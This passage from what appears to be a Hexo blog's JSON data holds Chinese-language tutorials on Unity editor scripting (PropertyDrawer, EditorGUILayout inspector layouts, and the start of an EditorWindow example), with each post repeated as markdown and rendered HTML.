EditorGUI.BeginChangeCheck();\n\n#pragma warning disable CS0618 // 类型或成员已过时\n            EditorGUI.MinMaxSlider(label,\n                        minMaxSliderRect, ref minHp, ref maxHp, 0, 100);\n#pragma warning restore CS0618 // 类型或成员已过时\n\n            EditorGUI.LabelField(labelRect, minHp.ToString(), maxHp.ToString());\n\n            if (EditorGUI.EndChangeCheck())\n            {\n                minHpProperty.intValue = Mathf.FloorToInt(minHp);\n                maxHpProperty.intValue = Mathf.FloorToInt(maxHp);\n            }\n        }\n    }\n\n    public override float GetPropertyHeight(SerializedProperty property, GUIContent label)\n    {\n        return base.GetPropertyHeight(property, label) * 2;\n    }\n}</code></pre><pre><code>* 3:HasPreviewGUI可以展示预览状态</code></pre><p>public override bool HasPreviewGUI ()<br>{<br>    return true;<br>}<br>public override GUIContent GetPreviewTitle ()<br>{<br>    return new GUIContent (“title”);<br>}<br>public override void OnPreviewSettings ()<br>{<br>    GUIStyle preLabel = new GUIStyle (“preLabel”);<br>    GUIStyle preButton = new GUIStyle (“preButton”);</p>\n<pre><code>GUILayout.Label (&quot;t&quot;, preLabel);\nGUILayout.Button (&quot;t2&quot;, preButton);</code></pre><p>}<br>public override void OnPreviewGUI (Rect r, GUIStyle background)<br>{<br>    GUI.Box (r, “Preview”);<br>}</p>\n<pre><code>* 4:PreviewRenderUtility在预览状态下,设置一个摄像机,照出当前的物体.待续\n* 5:完整的表示并使用PropertyDrawer,他是将一个数据类,完整的显示在一个脚本的Inspector面板上面</code></pre><pre><code>public enum Sex\n{\n    famale,//女同志\n    male//男同志\n}\n\n[System.Serializable]\npublic class Persion\n{\n    public string name;\n\n    public Sex sex;\n\n    public int age;\n\n    public string description;\n}</code></pre><pre><code></code></pre><pre><code>using UnityEngine;\n\npublic class ShowPersionInfo : MonoBehaviour\n{\n    public Persion persion;\n}</code></pre><pre><code></code></pre><p>using System;<br>using UnityEngine.UI;<br>using UnityEngine;<br>using UnityEditor;</p>\n<p>[CustomPropertyDrawer(typeof(Persion))] //自定义属性控制<br>public class PersionPropertiesDrawer : PropertyDrawer<br>{<br>    Rect top, middleLeft, middleRight, bottom;//绘制指定的区域<br>    SerializedProperty persionName, sex, age, description;//绘制对应的序列化属性<br>    public override void OnGUI(Rect position, SerializedProperty property, GUIContent label)<br>    {<br>        //base.OnGUI(position, property, label);<br>        //Debug.Log(“label:” + label.text);<br>        //Debug.Log(position);<br>        //Debug.Log(“OnGUI:” + property.name);</p>\n<pre><code>    //这个地方是将property转换成下一个property,也就是从persion这个属性转成Persion类中的name,sex,age,description属性了\n    //while (property.NextVisible(true))\n    //{\n    //    //Debug.Log(&quot;OnGUI:&quot; + property.name);\n    //}\n    top = new Rect(position.x, position.y, position.width, position.height / 4);\n    middleLeft = new Rect(position.x, position.y + position.height / 4, position.width/2, position.height / 4/2);\n    middleRight = new Rect(position.x + position.width/2, position.y + position.height / 4, position.width/2, position.height / 4);\n    bottom = new Rect(position.x, position.y + position.height / 2, position.width, position.height / 2);\n\n    //获取对应的序列化属性\n    //property这个属性对应的是 ShowPersionInfo 脚本中的Persion对象的persion属性,\n    //里面有几个Persion对象的persion属性,就调用这个方法绘制多少次\n    persionName = property.FindPropertyRelative(&quot;name&quot;);//通过属性的名字获取对应的序列化对象SerializedProperty\n    sex = property.FindPropertyRelative(&quot;sex&quot;);\n    age = property.FindPropertyRelative(&quot;age&quot;);\n    description = property.FindPropertyRelative(&quot;description&quot;);\n\n    //绘制属性\n    //EditorGUI.PropertyField第一个参数绘制该属性在Inspector在面板的位置.\n    EditorGUI.PropertyField(top, persionName);\n    EditorGUI.PropertyField(middleLeft, sex);\n    EditorGUI.PropertyField(middleRight, age);\n    description.stringValue = EditorGUI.TextArea(bottom, description.stringValue);\n}\n\npublic override float GetPropertyHeight(SerializedProperty property, GUIContent label)\n{\n    while (property.NextVisible(true))\n    {\n        //Debug.Log(&quot;GetPropertyHeight:&quot; + property.name);\n    }\n    return base.GetPropertyHeight(property, label) * 4;\n}\n\n/**\n * 1.OnGUI 和 GetPropertyHeight 里的 property 参数是同一个参数。该参数里存放的是 Persion 里的属性信息。\n * 2.OnGUI 和 GetPropertyHeight 里的 Label 参数也是同一个参数，该参数里存放的是 Persion 类的类名。\n * 3.position参数指的是需要在Inspector面板中绘制的区域信息,即当前脚本挂在在到GameObject上面的Inspector上的区域\n * 4.在Inspector面板中的一行高度为 16 \n */</code></pre><p>}<br>```</p>\n"},{"title":"8 EditorGUILayout","date":"2020-05-11T03:41:32.000Z","top":8,"_content":"# EditorGUILayout 在一个脚本的检视面板上进行提示可视化代码编写.\n\n* 1:使用编辑器编写一个简单的展示界面\n* 2:写一个mono脚本,挂在到一个game object上面\n```\nusing System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\n\npublic class Player : MonoBehaviour\n{\n    public int id;\n\n    public string playerName;\n    public string backStory;\n    public float health;\n    public float damage;\n\n    public float weaponDamage1, weaponDamage2;\n\n    public string shoeName;\n    public int shoeSize;\n    public string shoeType;\n\n    void Start()\n    {\n        health = 50;\n    }\n}\n```\n* 3:写一个PlayerInspector脚本,放在Editor目录下面\n```\nusing System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\nusing UnityEditor;\n\n//CustomEditor(typeof()) 用于关联你要自定义的脚本\n[CustomEditor(typeof(Player))]\n//必须要让该类继承自Editor\npublic class PlayerInspector : Editor\n{\n    Player player;\n    bool showWeapons;\n    private void OnEnable()\n    {\n        //获取当前编辑自定义Inspector的对象\n        player = target as Player;\n    }\n\n    //执行这一个函数来一个自定义检视面板\n    public override void OnInspectorGUI()\n    {\n        //base.OnInspectorGUI();//有这个API,表示原生的unity自带的自动展示出来的布局,有这个不需要下面的代码\n        EditorGUILayout.BeginVertical();\n\n        {\n            //空2行\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n        }\n\n\n        //绘制Player的基本信息\n        EditorGUILayout.LabelField(\"基本信息\");\n        player.id = EditorGUILayout.IntField(\"Player ID\", player.id);\n        player.playerName = EditorGUILayout.TextField(\"PlayerName\", player.playerName);\n\n        {\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n        }\n\n        //绘制Player的背景故事\n        EditorGUILayout.LabelField(\"背景故事\");\n        player.backStory = EditorGUILayout.TextArea(player.backStory,GUILayout.MinHeight(60));\n\n        {\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n        }\n\n        //使用滑块制作Player的生命值        \n        player.health = EditorGUILayout.Slider(\"生命值:\", player.health, 0, 100);\n        Color color = Color.gray;\n        if (player.health<20)\n        {\n            color = Color.red;\n        }\n        else if (player.health>80)\n        {\n            color = Color.green;\n        }\n        GUI.color = color;\n        //指定生命值的宽高\n        Rect progressRect = GUILayoutUtility.GetRect(50, 50);\n        //绘制生命条\n        EditorGUI.ProgressBar(progressRect, player.health, \"生命值:\");\n        //用此处理,防止上面的颜色影响下面的颜色\n        GUI.color = Color.white;\n\n        {\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n        }\n\n        //使用滑块绘制伤害值\n        player.damage = EditorGUILayout.Slider(\"Damage\", player.damage, 0, 20);\n\n        //根据伤害值的大小设置显示的类型和伤害语\n        if (player.damage<5)\n        {\n            EditorGUILayout.HelpBox(\"伤害太低,打不动敌人\", MessageType.Error);\n        }\n        else if (player.damage>15)\n        {\n            EditorGUILayout.HelpBox(\"伤害太高,对玩家不利于成长\", MessageType.Warning);\n        }\n        else\n        {\n            EditorGUILayout.HelpBox(\"伤害适中\", MessageType.Info);\n        }\n\n        {\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n        }\n\n\n        //设置内容折叠\n        showWeapons = EditorGUILayout.Foldout(showWeapons, \"Weapons\");\n        if (showWeapons)\n        {\n            player.weaponDamage1 = EditorGUILayout.FloatField(\"武器伤害1\", player.weaponDamage1);\n            player.weaponDamage2 = EditorGUILayout.FloatField(\"武器伤害1\", player.weaponDamage2);\n        }\n\n        {\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n        }\n\n        //绘制鞋子的信息\n        EditorGUILayout.LabelField(\"鞋子\");\n        EditorGUILayout.BeginHorizontal();\n        EditorGUILayout.LabelField(\"名字\", GUILayout.MaxWidth(60));\n        player.shoeName = EditorGUILayout.TextField(player.shoeName);\n        EditorGUILayout.LabelField(\"尺寸\", GUILayout.MaxWidth(60));\n        player.shoeSize = EditorGUILayout.IntField(player.shoeSize,GUILayout.MaxWidth(120));\n        EditorGUILayout.LabelField(\"类型\", GUILayout.MaxWidth(60));\n        player.shoeType = EditorGUILayout.TextField(player.shoeType);\n        EditorGUILayout.EndHorizontal();\n\n        EditorGUILayout.EndVertical();\n    }\n}\n\n```\n\n* 4:分析关键词:Vertical-垂直布局,在这对兄弟里面做的布局都是以垂直方向来排列的。\n```\nEditorGUILayout.BeginVertical();\n//code\nEditorGUILayout.EndVertical();\n```\n* 5:Horizontal-水平布局,在这对兄弟里面做的布局都是以水平方向来排列的。\n```\nEditorGUILayout.BeginHorizontal();\n//code\nEditorGUILayout.EndHorizontal();\n```\n* 6:它们的规律就是方法名都是以 Field 结尾，大伙们可以根据绘制的类型选择相对应的方法。 一般括号里面的参数，第一个为绘制该字段的名字（string 类型），第二个为绘制该字段的值，如下所示： \n\n```\nEditorGUILayout.LabelField()标签字段 \nEditorGUILayout.IntField() 整数字段 \nEditorGUILayout.FloatField() 浮点数字段 \nEditorGUILayout.TextField() 文本字段 \nEditorGUILayout.Vector2Field() 二维向量字段 \nEditorGUILayout.Vector3Field() 三维向量字段 \nEditorGUILayout.Vector4Field() 四维向量字段 \nEditorGUILayout.ColorField() 颜色字段\nEditorGUILayout.Slider()滑块进度条\n```\n* 7:EditorGUILayout.Slider() 制作一个滑动条用户可以拖动来改变值，在最小和最大值之间,\nGUILayoutUtility获取Rect的通用方法\nEditorGUI.ProgressBar（）用于绘制一个进度条，从上可知：\n第一个参数是设置进度条的大小，类型是一个 Rect。 \n第二个参数是设置显示的值， \n第三个参数是设置进度条的名字\n* 8:EditorGUILayout.HelpBox(),帮助框/提示框\n* \n\n","source":"_posts/Unity/UnityEditor/8 EditorGUILayout.md","raw":"---\ntitle: 8 EditorGUILayout\ndate: 2020-05-11 11:41:32\ntop: 8\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n# EditorGUILayout 在一个脚本的检视面板上进行提示可视化代码编写.\n\n* 1:使用编辑器编写一个简单的展示界面\n* 2:写一个mono脚本,挂在到一个game object上面\n```\nusing System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\n\npublic class Player : MonoBehaviour\n{\n    public int id;\n\n    public string playerName;\n    public string backStory;\n    public float health;\n    public float damage;\n\n    public float weaponDamage1, weaponDamage2;\n\n    public string shoeName;\n    public int shoeSize;\n    public string shoeType;\n\n    void Start()\n    {\n        health = 50;\n    }\n}\n```\n* 3:写一个PlayerInspector脚本,放在Editor目录下面\n```\nusing System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\nusing UnityEditor;\n\n//CustomEditor(typeof()) 用于关联你要自定义的脚本\n[CustomEditor(typeof(Player))]\n//必须要让该类继承自Editor\npublic class PlayerInspector : Editor\n{\n    Player player;\n    bool showWeapons;\n    private void OnEnable()\n    {\n        //获取当前编辑自定义Inspector的对象\n        player = target as Player;\n    }\n\n    //执行这一个函数来一个自定义检视面板\n    public override void OnInspectorGUI()\n    {\n        //base.OnInspectorGUI();//有这个API,表示原生的unity自带的自动展示出来的布局,有这个不需要下面的代码\n        EditorGUILayout.BeginVertical();\n\n        {\n            //空2行\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n        }\n\n\n        //绘制Player的基本信息\n        EditorGUILayout.LabelField(\"基本信息\");\n        player.id = EditorGUILayout.IntField(\"Player ID\", player.id);\n        player.playerName = EditorGUILayout.TextField(\"PlayerName\", player.playerName);\n\n        {\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n        }\n\n        //绘制Player的背景故事\n        EditorGUILayout.LabelField(\"背景故事\");\n        player.backStory = EditorGUILayout.TextArea(player.backStory,GUILayout.MinHeight(60));\n\n        {\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n        }\n\n        //使用滑块制作Player的生命值        \n        player.health = EditorGUILayout.Slider(\"生命值:\", player.health, 0, 100);\n        Color color = Color.gray;\n        if (player.health<20)\n        {\n            color = Color.red;\n        }\n        else if (player.health>80)\n        {\n            color = Color.green;\n        }\n        GUI.color = color;\n        //指定生命值的宽高\n        Rect progressRect = GUILayoutUtility.GetRect(50, 50);\n        //绘制生命条\n        EditorGUI.ProgressBar(progressRect, player.health, \"生命值:\");\n        //用此处理,防止上面的颜色影响下面的颜色\n        GUI.color = Color.white;\n\n        {\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n        }\n\n        //使用滑块绘制伤害值\n        player.damage = EditorGUILayout.Slider(\"Damage\", player.damage, 0, 20);\n\n        //根据伤害值的大小设置显示的类型和伤害语\n        if (player.damage<5)\n        {\n            EditorGUILayout.HelpBox(\"伤害太低,打不动敌人\", MessageType.Error);\n        }\n        else if (player.damage>15)\n        {\n            EditorGUILayout.HelpBox(\"伤害太高,对玩家不利于成长\", MessageType.Warning);\n        }\n        else\n        {\n            EditorGUILayout.HelpBox(\"伤害适中\", MessageType.Info);\n        }\n\n        {\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n        }\n\n\n        //设置内容折叠\n        showWeapons = EditorGUILayout.Foldout(showWeapons, \"Weapons\");\n        if (showWeapons)\n        {\n            player.weaponDamage1 = EditorGUILayout.FloatField(\"武器伤害1\", player.weaponDamage1);\n            player.weaponDamage2 = EditorGUILayout.FloatField(\"武器伤害1\", player.weaponDamage2);\n        }\n\n        {\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n            EditorGUILayout.Space();\n        }\n\n        //绘制鞋子的信息\n        EditorGUILayout.LabelField(\"鞋子\");\n        EditorGUILayout.BeginHorizontal();\n        EditorGUILayout.LabelField(\"名字\", GUILayout.MaxWidth(60));\n        player.shoeName = EditorGUILayout.TextField(player.shoeName);\n        EditorGUILayout.LabelField(\"尺寸\", GUILayout.MaxWidth(60));\n        player.shoeSize = EditorGUILayout.IntField(player.shoeSize,GUILayout.MaxWidth(120));\n        EditorGUILayout.LabelField(\"类型\", GUILayout.MaxWidth(60));\n        player.shoeType = EditorGUILayout.TextField(player.shoeType);\n        EditorGUILayout.EndHorizontal();\n\n        EditorGUILayout.EndVertical();\n    }\n}\n\n```\n\n* 4:分析关键词:Vertical-垂直布局,在这对兄弟里面做的布局都是以垂直方向来排列的。\n```\nEditorGUILayout.BeginVertical();\n//code\nEditorGUILayout.EndVertical();\n```\n* 5:Horizontal-水平布局,在这对兄弟里面做的布局都是以水平方向来排列的。\n```\nEditorGUILayout.BeginHorizontal();\n//code\nEditorGUILayout.EndHorizontal();\n```\n* 6:它们的规律就是方法名都是以 Field 结尾，大伙们可以根据绘制的类型选择相对应的方法。 一般括号里面的参数，第一个为绘制该字段的名字（string 类型），第二个为绘制该字段的值，如下所示： \n\n```\nEditorGUILayout.LabelField()标签字段 \nEditorGUILayout.IntField() 整数字段 \nEditorGUILayout.FloatField() 浮点数字段 \nEditorGUILayout.TextField() 文本字段 \nEditorGUILayout.Vector2Field() 二维向量字段 \nEditorGUILayout.Vector3Field() 三维向量字段 \nEditorGUILayout.Vector4Field() 四维向量字段 \nEditorGUILayout.ColorField() 颜色字段\nEditorGUILayout.Slider()滑块进度条\n```\n* 7:EditorGUILayout.Slider() 制作一个滑动条用户可以拖动来改变值，在最小和最大值之间,\nGUILayoutUtility获取Rect的通用方法\nEditorGUI.ProgressBar（）用于绘制一个进度条，从上可知：\n第一个参数是设置进度条的大小，类型是一个 Rect。 \n第二个参数是设置显示的值， \n第三个参数是设置进度条的名字\n* 8:EditorGUILayout.HelpBox(),帮助框/提示框\n* \n\n","slug":"Unity/UnityEditor/8 EditorGUILayout","published":1,"updated":"2020-05-15T02:50:31.825Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d11005o2gk7234w8xx1","content":"<h1 id=\"EditorGUILayout-在一个脚本的检视面板上进行提示可视化代码编写\"><a href=\"#EditorGUILayout-在一个脚本的检视面板上进行提示可视化代码编写\" class=\"headerlink\" title=\"EditorGUILayout 在一个脚本的检视面板上进行提示可视化代码编写.\"></a>EditorGUILayout 在一个脚本的检视面板上进行提示可视化代码编写.</h1><ul>\n<li>1:使用编辑器编写一个简单的展示界面</li>\n<li>2:写一个mono脚本,挂在到一个game object上面<pre><code>using System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\n</code></pre></li>\n</ul>\n<p>public class Player : MonoBehaviour<br>{<br>    public int id;</p>\n<pre><code>public string playerName;\npublic string backStory;\npublic float health;\npublic float damage;\n\npublic float weaponDamage1, weaponDamage2;\n\npublic string shoeName;\npublic int shoeSize;\npublic string shoeType;\n\nvoid Start()\n{\n    health = 50;\n}</code></pre><p>}</p>\n<pre><code>* 3:写一个PlayerInspector脚本,放在Editor目录下面</code></pre><p>using System.Collections;<br>using System.Collections.Generic;<br>using UnityEngine;<br>using UnityEditor;</p>\n<p>//CustomEditor(typeof()) 用于关联你要自定义的脚本<br>[CustomEditor(typeof(Player))]<br>//必须要让该类继承自Editor<br>public class PlayerInspector : Editor<br>{<br>    Player player;<br>    bool showWeapons;<br>    private void OnEnable()<br>    {<br>        //获取当前编辑自定义Inspector的对象<br>        player = target as Player;<br>    }</p>\n<pre><code>//执行这一个函数来一个自定义检视面板\npublic override void OnInspectorGUI()\n{\n    //base.OnInspectorGUI();//有这个API,表示原生的unity自带的自动展示出来的布局,有这个不需要下面的代码\n    EditorGUILayout.BeginVertical();\n\n    {\n        //空2行\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n    }\n\n\n    //绘制Player的基本信息\n    EditorGUILayout.LabelField(&quot;基本信息&quot;);\n    player.id = EditorGUILayout.IntField(&quot;Player ID&quot;, player.id);\n    player.playerName = EditorGUILayout.TextField(&quot;PlayerName&quot;, player.playerName);\n\n    {\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n    }\n\n    //绘制Player的背景故事\n    EditorGUILayout.LabelField(&quot;背景故事&quot;);\n    player.backStory = EditorGUILayout.TextArea(player.backStory,GUILayout.MinHeight(60));\n\n    {\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n    }\n\n    //使用滑块制作Player的生命值        \n    player.health = EditorGUILayout.Slider(&quot;生命值:&quot;, player.health, 0, 100);\n    Color color = Color.gray;\n    if (player.health&lt;20)\n    {\n        color = Color.red;\n    }\n    else if (player.health&gt;80)\n    {\n        color = Color.green;\n    }\n    GUI.color = color;\n    //指定生命值的宽高\n    Rect progressRect = GUILayoutUtility.GetRect(50, 50);\n    //绘制生命条\n    EditorGUI.ProgressBar(progressRect, player.health, &quot;生命值:&quot;);\n    //用此处理,防止上面的颜色影响下面的颜色\n    GUI.color = Color.white;\n\n    {\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n    }\n\n    //使用滑块绘制伤害值\n    player.damage = EditorGUILayout.Slider(&quot;Damage&quot;, player.damage, 0, 20);\n\n    //根据伤害值的大小设置显示的类型和伤害语\n    if (player.damage&lt;5)\n    {\n        EditorGUILayout.HelpBox(&quot;伤害太低,打不动敌人&quot;, MessageType.Error);\n    }\n    else if (player.damage&gt;15)\n    {\n        EditorGUILayout.HelpBox(&quot;伤害太高,对玩家不利于成长&quot;, MessageType.Warning);\n    }\n    else\n    {\n        EditorGUILayout.HelpBox(&quot;伤害适中&quot;, MessageType.Info);\n    }\n\n    {\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n    }\n\n\n    //设置内容折叠\n    showWeapons = EditorGUILayout.Foldout(showWeapons, &quot;Weapons&quot;);\n    if (showWeapons)\n    {\n        player.weaponDamage1 = EditorGUILayout.FloatField(&quot;武器伤害1&quot;, player.weaponDamage1);\n        player.weaponDamage2 = EditorGUILayout.FloatField(&quot;武器伤害1&quot;, player.weaponDamage2);\n    }\n\n    {\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n    }\n\n    //绘制鞋子的信息\n    EditorGUILayout.LabelField(&quot;鞋子&quot;);\n    EditorGUILayout.BeginHorizontal();\n    EditorGUILayout.LabelField(&quot;名字&quot;, GUILayout.MaxWidth(60));\n    player.shoeName = EditorGUILayout.TextField(player.shoeName);\n    EditorGUILayout.LabelField(&quot;尺寸&quot;, GUILayout.MaxWidth(60));\n    player.shoeSize = EditorGUILayout.IntField(player.shoeSize,GUILayout.MaxWidth(120));\n    EditorGUILayout.LabelField(&quot;类型&quot;, GUILayout.MaxWidth(60));\n    player.shoeType = EditorGUILayout.TextField(player.shoeType);\n    EditorGUILayout.EndHorizontal();\n\n    EditorGUILayout.EndVertical();\n}</code></pre><p>}</p>\n<pre><code>\n* 4:分析关键词:Vertical-垂直布局,在这对兄弟里面做的布局都是以垂直方向来排列的。</code></pre><p>EditorGUILayout.BeginVertical();<br>//code<br>EditorGUILayout.EndVertical();</p>\n<pre><code>* 5:Horizontal-水平布局,在这对兄弟里面做的布局都是以水平方向来排列的。</code></pre><p>EditorGUILayout.BeginHorizontal();<br>//code<br>EditorGUILayout.EndHorizontal();</p>\n<pre><code>* 6:它们的规律就是方法名都是以 Field 结尾，大伙们可以根据绘制的类型选择相对应的方法。 一般括号里面的参数，第一个为绘制该字段的名字（string 类型），第二个为绘制该字段的值，如下所示： \n</code></pre><p>EditorGUILayout.LabelField()标签字段<br>EditorGUILayout.IntField() 整数字段<br>EditorGUILayout.FloatField() 浮点数字段<br>EditorGUILayout.TextField() 文本字段<br>EditorGUILayout.Vector2Field() 二维向量字段<br>EditorGUILayout.Vector3Field() 三维向量字段<br>EditorGUILayout.Vector4Field() 四维向量字段<br>EditorGUILayout.ColorField() 颜色字段<br>EditorGUILayout.Slider()滑块进度条</p>\n<pre><code>* 7:EditorGUILayout.Slider() 制作一个滑动条用户可以拖动来改变值，在最小和最大值之间,\nGUILayoutUtility获取Rect的通用方法\nEditorGUI.ProgressBar（）用于绘制一个进度条，从上可知：\n第一个参数是设置进度条的大小，类型是一个 Rect。 \n第二个参数是设置显示的值， \n第三个参数是设置进度条的名字\n* 8:EditorGUILayout.HelpBox(),帮助框/提示框\n* \n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"EditorGUILayout-在一个脚本的检视面板上进行提示可视化代码编写\"><a href=\"#EditorGUILayout-在一个脚本的检视面板上进行提示可视化代码编写\" class=\"headerlink\" title=\"EditorGUILayout 在一个脚本的检视面板上进行提示可视化代码编写.\"></a>EditorGUILayout 在一个脚本的检视面板上进行提示可视化代码编写.</h1><ul>\n<li>1:使用编辑器编写一个简单的展示界面</li>\n<li>2:写一个mono脚本,挂在到一个game object上面<pre><code>using System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\n</code></pre></li>\n</ul>\n<p>public class Player : MonoBehaviour<br>{<br>    public int id;</p>\n<pre><code>public string playerName;\npublic string backStory;\npublic float health;\npublic float damage;\n\npublic float weaponDamage1, weaponDamage2;\n\npublic string shoeName;\npublic int shoeSize;\npublic string shoeType;\n\nvoid Start()\n{\n    health = 50;\n}</code></pre><p>}</p>\n<pre><code>* 3:写一个PlayerInspector脚本,放在Editor目录下面</code></pre><p>using System.Collections;<br>using System.Collections.Generic;<br>using UnityEngine;<br>using UnityEditor;</p>\n<p>//CustomEditor(typeof()) 用于关联你要自定义的脚本<br>[CustomEditor(typeof(Player))]<br>//必须要让该类继承自Editor<br>public class PlayerInspector : Editor<br>{<br>    Player player;<br>    bool showWeapons;<br>    private void OnEnable()<br>    {<br>        //获取当前编辑自定义Inspector的对象<br>        player = target as Player;<br>    }</p>\n<pre><code>//执行这一个函数来一个自定义检视面板\npublic override void OnInspectorGUI()\n{\n    //base.OnInspectorGUI();//有这个API,表示原生的unity自带的自动展示出来的布局,有这个不需要下面的代码\n    EditorGUILayout.BeginVertical();\n\n    {\n        //空2行\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n    }\n\n\n    //绘制Player的基本信息\n    EditorGUILayout.LabelField(&quot;基本信息&quot;);\n    player.id = EditorGUILayout.IntField(&quot;Player ID&quot;, player.id);\n    player.playerName = EditorGUILayout.TextField(&quot;PlayerName&quot;, player.playerName);\n\n    {\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n    }\n\n    //绘制Player的背景故事\n    EditorGUILayout.LabelField(&quot;背景故事&quot;);\n    player.backStory = EditorGUILayout.TextArea(player.backStory,GUILayout.MinHeight(60));\n\n    {\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n    }\n\n    //使用滑块制作Player的生命值        \n    player.health = EditorGUILayout.Slider(&quot;生命值:&quot;, player.health, 0, 100);\n    Color color = Color.gray;\n    if (player.health&lt;20)\n    {\n        color = Color.red;\n    }\n    else if (player.health&gt;80)\n    {\n        color = Color.green;\n    }\n    GUI.color = color;\n    //指定生命值的宽高\n    Rect progressRect = GUILayoutUtility.GetRect(50, 50);\n    //绘制生命条\n    EditorGUI.ProgressBar(progressRect, player.health, &quot;生命值:&quot;);\n    //用此处理,防止上面的颜色影响下面的颜色\n    GUI.color = Color.white;\n\n    {\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n    }\n\n    //使用滑块绘制伤害值\n    player.damage = EditorGUILayout.Slider(&quot;Damage&quot;, player.damage, 0, 20);\n\n    //根据伤害值的大小设置显示的类型和伤害语\n    if (player.damage&lt;5)\n    {\n        EditorGUILayout.HelpBox(&quot;伤害太低,打不动敌人&quot;, MessageType.Error);\n    }\n    else if (player.damage&gt;15)\n    {\n        EditorGUILayout.HelpBox(&quot;伤害太高,对玩家不利于成长&quot;, MessageType.Warning);\n    }\n    else\n    {\n        EditorGUILayout.HelpBox(&quot;伤害适中&quot;, MessageType.Info);\n    }\n\n    {\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n    }\n\n\n    //设置内容折叠\n    showWeapons = EditorGUILayout.Foldout(showWeapons, &quot;Weapons&quot;);\n    if (showWeapons)\n    {\n        player.weaponDamage1 = EditorGUILayout.FloatField(&quot;武器伤害1&quot;, player.weaponDamage1);\n        player.weaponDamage2 = EditorGUILayout.FloatField(&quot;武器伤害1&quot;, player.weaponDamage2);\n    }\n\n    {\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n        EditorGUILayout.Space();\n    }\n\n    //绘制鞋子的信息\n    EditorGUILayout.LabelField(&quot;鞋子&quot;);\n    EditorGUILayout.BeginHorizontal();\n    EditorGUILayout.LabelField(&quot;名字&quot;, GUILayout.MaxWidth(60));\n    player.shoeName = EditorGUILayout.TextField(player.shoeName);\n    EditorGUILayout.LabelField(&quot;尺寸&quot;, GUILayout.MaxWidth(60));\n    player.shoeSize = EditorGUILayout.IntField(player.shoeSize,GUILayout.MaxWidth(120));\n    EditorGUILayout.LabelField(&quot;类型&quot;, GUILayout.MaxWidth(60));\n    player.shoeType = EditorGUILayout.TextField(player.shoeType);\n    EditorGUILayout.EndHorizontal();\n\n    EditorGUILayout.EndVertical();\n}</code></pre><p>}</p>\n<pre><code>\n* 4:分析关键词:Vertical-垂直布局,在这对兄弟里面做的布局都是以垂直方向来排列的。</code></pre><p>EditorGUILayout.BeginVertical();<br>//code<br>EditorGUILayout.EndVertical();</p>\n<pre><code>* 5:Horizontal-水平布局,在这对兄弟里面做的布局都是以水平方向来排列的。</code></pre><p>EditorGUILayout.BeginHorizontal();<br>//code<br>EditorGUILayout.EndHorizontal();</p>\n<pre><code>* 6:它们的规律就是方法名都是以 Field 结尾，大伙们可以根据绘制的类型选择相对应的方法。 一般括号里面的参数，第一个为绘制该字段的名字（string 类型），第二个为绘制该字段的值，如下所示： \n</code></pre><p>EditorGUILayout.LabelField()标签字段<br>EditorGUILayout.IntField() 整数字段<br>EditorGUILayout.FloatField() 浮点数字段<br>EditorGUILayout.TextField() 文本字段<br>EditorGUILayout.Vector2Field() 二维向量字段<br>EditorGUILayout.Vector3Field() 三维向量字段<br>EditorGUILayout.Vector4Field() 四维向量字段<br>EditorGUILayout.ColorField() 颜色字段<br>EditorGUILayout.Slider()滑块进度条</p>\n<pre><code>* 7:EditorGUILayout.Slider() 制作一个滑动条用户可以拖动来改变值，在最小和最大值之间,\nGUILayoutUtility获取Rect的通用方法\nEditorGUI.ProgressBar（）用于绘制一个进度条，从上可知：\n第一个参数是设置进度条的大小，类型是一个 Rect。 \n第二个参数是设置显示的值， \n第三个参数是设置进度条的名字\n* 8:EditorGUILayout.HelpBox(),帮助框/提示框\n* \n</code></pre>"},{"title":"9 EditorWindow案例1","date":"2020-05-11T03:41:32.000Z","top":9,"_content":"# 使用Editor编写一个window面板\n\n* 1:上面可以简单的制作一个window面板的编辑器,一些方法的使用需要看[EditorGUI方法介绍](https://github.com/BingJin-Zheng/Record/blob/master/Unity_Editor/4%20EditorGUI.md)\n* 2:编写一个 bug保存到本地 的window面板\n```\nusing System.Collections;\nusing System.Collections.Generic;\nusing System.IO;\nusing UnityEditor;\nusing UnityEditor.SceneManagement;\nusing UnityEngine;\n\npublic class BugReportWindow : EditorWindow\n{\n\n    Vector2 v2 = new Vector2(0, 0);\n    int v = 0;\n    string[] Messages = { 